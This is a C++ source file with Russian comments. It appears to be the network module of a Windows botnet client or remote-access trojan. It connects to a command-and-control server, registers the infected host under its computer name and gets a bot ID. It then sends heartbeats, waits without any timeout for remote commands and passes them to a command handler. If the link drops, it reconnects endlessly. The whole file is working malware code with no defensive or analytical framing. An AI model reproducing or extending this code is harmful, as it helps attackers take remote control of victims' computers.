// Core/network.cpp — без таймаутов, с бесконечным ожиданием команд
#include "network.h"
#include "persistence.h"
#include "commands.h"
#include "compression.h"
#include <wincrypt.h>
#include <thread>
#include <mutex>
#include <queue>
#include <atomic>
#include <chrono>
#include <cstring>

#pragma comment(lib, "crypt32.lib")

std::string g_bot_id;
SOCKET g_c2_socket = INVALID_SOCKET;

static std::mutex g_send_mutex;
static std::priority_queue<std::pair<int, std::vector<uint8_t>>> g_send_queue;
static std::mutex g_queue_mutex;
static std::condition_variable g_queue_cv;
static std::atomic<bool> g_sender_running{false};
static std::thread g_sender_thread;

const unsigned int HEARTBEAT_MS = 5000;

std::string get_hostname() {
    char buffer[MAX_COMPUTERNAME_LENGTH+1];
    DWORD size = sizeof(buffer);
    if (!GetComputerNameA(buffer, &size)) return "unknown";
    return std::string(buffer, size);
}

void send_binary(SOCKET sock, const std::vector<uint8_t>& data) {
    uint32_t len = htonl((uint32_t)data.size());
    send(sock, (const char*)&len, 4, 0);
    send(sock, (const char*)data.data(), (int)data.size(), 0);
}

std::vector<uint8_t> recv_binary(SOCKET sock) {
    uint32_t len = 0;
    int recvd = recv(sock, (char*)&len, 4, 0);
    if (recvd != 4) return {};
    len = ntohl(len);
    if (len == 0 || len > 10 * 1024 * 1024) return {};
    std::vector<uint8_t> buf(len);
    size_t total = 0;
    while (total < len) {
        int r = recv(sock, (char*)buf.data() + total, (int)(len - total), 0);
        if (r <= 0) return {};
        total += r;
    }
    return buf;
}

void sender_loop() {
    auto last_hb = std::chrono::steady_clock::now();
    while (g_sender_running) {
        std::unique_lock<std::mutex> lock(g_queue_mutex);
        g_queue_cv.wait_for(lock, std::chrono::milliseconds(1000), []{ return !g_send_queue.empty() || !g_sender_running; });
        if (!g_sender_running) break;
        
        auto now = std::chrono::steady_clock::now();
        if (g_c2_socket != INVALID_SOCKET && 
            std::chrono::duration_cast<std::chrono::milliseconds>(now - last_hb).count() >= HEARTBEAT_MS) {
            std::string beat = "pong";
            std::vector<uint8_t> data(beat.begin(), beat.end());
            send_binary(g_c2_socket, data);
            last_hb = now;
        }
        
        while (!g_send_queue.empty() && g_c2_socket != INVALID_SOCKET) {
            auto pkt = g_send_queue.top();
            g_send_queue.pop();
            send_binary(g_c2_socket, pkt.second);
        }
    }
}

void init_network_async() {
    if (g_sender_running) return;
    g_sender_running = true;
    g_sender_thread = std::thread(sender_loop);
}

void shutdown_network_async() {
    g_sender_running = false;
    g_queue_cv.notify_all();
    if (g_sender_thread.joinable()) g_sender_thread.join();
}

bool init_winsock() {
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2,2), &wsa) == 0;
}

void cleanup_winsock() {
    WSACleanup();
}

SOCKET connect_to_server(const std::string& ip, int port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip.c_str());
    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return INVALID_SOCKET;
    }
    // НЕ устанавливаем таймаут — ждём команды бесконечно
    g_c2_socket = sock;
    init_network_async();
    return sock;
}

void register_with_server(SOCKET sock, const std::string& hostname, std::string& bot_id) {
    std::string hello = "HELLO";
    send_binary(sock, std::vector<uint8_t>(hello.begin(), hello.end()));
    std::vector<uint8_t> ack = recv_binary(sock);
    if (ack.empty() || std::string(ack.begin(), ack.end()) != "ACK") return;
    std::string reg = "REGISTER:" + hostname;
    send_binary(sock, std::vector<uint8_t>(reg.begin(), reg.end()));
    std::vector<uint8_t> id_data = recv_binary(sock);
    if (!id_data.empty()) {
        std::string id_str(id_data.begin(), id_data.end());
        if (id_str.rfind("ID:",0) == 0) bot_id = id_str.substr(3);
    }
}

void push_to_send_queue(const std::vector<uint8_t>& data, int priority) {
    std::lock_guard<std::mutex> lock(g_queue_mutex);
    g_send_queue.push({priority, data});
    g_queue_cv.notify_one();
}

void heartbeat_loop(SOCKET& sock, const Config& cfg) {
    while (true) {
        std::vector<uint8_t> cmd_data = recv_binary(sock);
        if (cmd_data.empty()) {
            shutdown_network_async();
            closesocket(sock);
            while (true) {
                sock = connect_to_server(cfg.c2_ip, cfg.c2_port);
                if (sock != INVALID_SOCKET) {
                    register_with_server(sock, get_hostname(), g_bot_id);
                    if (!g_bot_id.empty()) break;
                }
                Sleep(5000);
            }
            continue;
        }
        std::string cmd(cmd_data.begin(), cmd_data.end());
        process_command(cmd, sock);
    }
}